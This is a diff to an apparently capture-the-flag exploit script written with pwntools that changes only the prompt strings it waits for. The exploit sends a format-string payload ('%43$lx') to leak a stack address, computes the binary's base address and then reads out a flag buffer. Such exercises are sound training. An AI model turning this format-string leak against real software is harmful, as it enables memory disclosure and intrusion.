@@ -93,13 +93,13 @@ def exploit() -> bool:
 
     # main is @ stack var 43
     io.info("Leaking base address of the binary.")
-    io.recvuntil(b"something: ")
+    io.recvuntil(b"commands? ")
 
     payload = "%43$lx"
     io.sendline(payload.encode("ascii"))
 
-    io.recvuntil(b"said:")
-    main_addr = int(io.recvuntil(b"I bet", drop=True).decode("ascii"), 16)
+    io.recvuntil(b"execute: ")
+    main_addr = int(io.recvuntil(b"Where", drop=True).decode("ascii"), 16)
 
     # logging
     exe.address = main_addr - exe.sym["main"]
@@ -111,11 +111,11 @@ def exploit() -> bool:
     # entering in the address of flag_buffer
     io.info("Leaking flag.")
 
-    io.recvuntil(b"from? ")
+    io.recvuntil(b"start? ")
     io.sendline(f"{flag_buffer}".encode("ascii"))
 
     # flag obtained
-    io.recvuntil(b"interesting: ")
+    io.recvuntil(b"command: ")
     flag = io.recvall()
 
     if flag is None:
